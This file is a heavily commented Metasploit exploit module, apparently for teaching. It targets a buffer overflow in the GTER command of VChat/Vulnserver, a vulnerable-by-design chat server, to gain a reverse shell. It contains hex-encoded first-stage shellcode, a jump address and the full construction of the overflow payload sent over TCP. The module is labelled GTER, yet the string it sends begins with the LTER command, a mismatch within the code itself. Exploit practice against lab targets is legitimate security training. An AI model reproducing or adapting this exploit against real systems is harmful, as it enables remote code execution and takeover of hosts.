##
# The # symbol starts a comment
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
# File path: /usr/share/metasploit-framework/modules/exploit/windows/VChat/GTER_Reuse.rb
##
# This module exploits the GTER command of vulnerable chat server using manually derived shellcode.
##

class MetasploitModule < Msf::Exploit::Remote   # This is a remote exploit module inheriting from the remote exploit class
  Rank = NormalRanking        # Potential impact to the target
  include Msf::Exploit::Remote::Tcp   # Include remote tcp exploit module
  def initialize(info = {})   # i.e. constructor, setting the initial values
    super(update_info(info,
      'Name'           => 'VChat/Vulnserver Buffer Overflow-GTER command Code Reuse', # Name of the target
      'Description'    => %q{ # Explaining what the module does
         This module exploits a buffer overflow in an Vulnerable By Design (VBD) server to gain a reverse shell. 
      },
      'Author'         => [ 'fxw' ],  ## Hacker name
      'License'        => MSF_LICENSE,
      'References'     =>     # References for the vulnerability or exploit
        [
          #[ 'URL', 'https://github.com/DaintyJet/Making-Dos-DDoS-Metasploit-Module-Vulnserver/'],
          [ 'URL', 'https://github.com/DaintyJet/VChat_LTER' ]
        ],
      'Privileged'     => false,
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread', # Run the shellcode in a thread and exit the thread when it is done 
        },
      'Payload'        =>     # How to encode and generate the payload
        {
          'BadChars' => "\x00\x0a\x0d"        # Bad characters to avoid in generated shellcode
        },
      'Platform'       => 'Win',      # Supporting what platforms are supported, e.g., win, linux, osx, unix, bsd.
      'Targets'        =>     #  targets for many exploits
      [
        [ 'EssFuncDLL-JMPTRGT',
          {
            'jmptrgt' => 0x6250184E # This will be available in [target['jmptrgt']]
          }
        ]
      ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Mar. 30, 2022'))   # When the vulnerability was disclosed in public
      register_options( # Available options: CHOST(), CPORT(), LHOST(), LPORT(), Proxies(), RHOST(), RHOSTS(), RPORT(), SSLVersion()
          [
          OptInt.new('RETOFFSET_LTER', [true, 'Offset of Return Address in function GTER', 3574]),
          OptString.new('JUMP_ENCODE', [true, 'Encoded Jump Instruction, Provided in HEX Digits', "\x25\x26\x2a\x4f\x3c\x25\x41\x41\x30\x42\x2d\x69\x7c\x7f\x22\x2d\x41\x78\x77\x2b\x2d\x57\x7a\x78\x21\x50\x25\x26\x2a\x4f\x3c\x25\x41\x41\x30\x42\x2d\x70\x2c\x64\x6f\x2d\x7a\x3e\x38\x6f\x2d\x2d\x3e\x71\x21\x50"]),
          OptString.new('FIRST_STAGE', [true, 'First Stage Shellcode, Provided in HEX Digits', "\x25\x26\x2a\x4f\x3c\x25\x41\x41\x30\x42\x2d\x76\x25\x67\x2d\x2d\x7e\x3d\x38\x7f\x2d\x52\x26\x61\x7f\x50\x25\x26\x2a\x4f\x3c\x25\x41\x41\x30\x42\x2d\x33\x7f\x7f\x26\x2d\x2a\x70\x62\x2b\x2d\x4f\x55\x7d\x7b\x50\x25\x26\x2a\x4f\x3c\x25\x41\x41\x30\x42\x2d\x41\x2a\x25\x29\x2d\x42\x3e\x2a\x5f\x2d\x21\x3b\x7f\x47\x50\x25\x26\x2a\x4f\x3c\x25\x41\x41\x30\x42\x2d\x58\x7b\x21\x32\x2d\x21\x21\x2d\x2a\x2d\x57\x35\x7f\x3b\x50\x25\x26\x2a\x4f\x3c\x25\x41\x41\x30\x42\x2d\x66\x29\x3b\x38\x2d\x3b\x22\x38\x38\x2d\x2a\x58\x24\x61\x50\x25\x26\x2a\x4f\x3c\x25\x41\x41\x30\x42\x2d\x2d\x22\x29\x3b\x2d\x28\x37\x3e\x38\x2d\x67\x3e\x6a\x5b\x50\x25\x26\x2a\x4f\x3c\x25\x41\x41\x30\x42\x2d\x38\x29\x3e\x45\x2d\x3e\x3e\x39\x3c\x2d\x22\x57\x46\x3b\x50\x25\x26\x2a\x4f\x3c\x25\x41\x41\x30\x42\x2d\x21\x30\x32\x22\x2d\x41\x3c\x48\x30\x2d\x42\x26\x24\x41\x50\x25\x26\x2a\x4f\x3c\x25\x41\x41\x30\x42\x2d\x4a\x24\x38\x23\x2d\x30\x3b\x38\x33\x2d\x22\x34\x23\x41\x50\x25\x26\x2a\x4f\x3c\x25\x41\x41\x30\x42\x2d\x4f\x3b\x35\x6f\x2d\x5f\x44\x27\x21\x2d\x77\x2c\x3b\x41\x50\x25\x26\x2a\x4f\x3c\x25\x41\x41\x30\x42\x2d\x7f\x6d\x39\x38\x2d\x7f\x7f\x3c\x24\x2d\x7f\x26\x25\x72\x50"]),
          Opt::RPORT(9999),
          Opt::RHOSTS('192.168.7.191')
      ])
  end

  def exploit # Actual exploit

    encode_jump = datastore['JUMP_ENCODE'].gsub(/\\x([0-9a-fA-F]{2})/) { $1.to_i(16).chr }
    first_stage = datastore['FIRST_STAGE'].gsub(/\\x([0-9a-fA-F]{2})/) { $1.to_i(16).chr }

    print_status("Connecting to target...")
    print_status("Ensure DLL Share is setup!")
    connect   # Connect to the target

    outbound_LTER = 'LTER .' + "A"*64 + "\x54"+ "\x58" + "\x66\x2d\x69\x02" + "\x66\x2d\x69\x02" + "\x66\x2d\x69\x02" + "\x66\x2d\x69\x02" + "\x50" +"\x5c" + first_stage + "\A"*(datastore['RETOFFSET_LTER'] - (64 + 20 + 79 + 4 + first_stage.length())) + "\x54" + "\x58" + "\x2c\x30" + "\x50" + "\x5c" + encode_jump + "A" * (79 - (6 + encode_jump.length())) +"\x75\x08" + "\x74\x06" + [target['jmptrgt']].pack('V') + "C" * 2 + "\x54" + "\x58" + "\x66\x05\x66\x12" + "\x50" + "\x5c" + "\x25\x4a\x4d\x4e\x55" + "\x25\x35\x32\x31\x2a" + "\x05\x75\x40\x48\x48" + "\x05\x76\x40\x48\x48" + "\x50" + "C"*(5000 - (3506 + 4 + 2 + 8)) # Create the malicious string that will be sent to the target

    print_status("Sending Exploit")
    sock.puts(outbound_LTER)  # Send the attacking payload
    disconnect
  end
end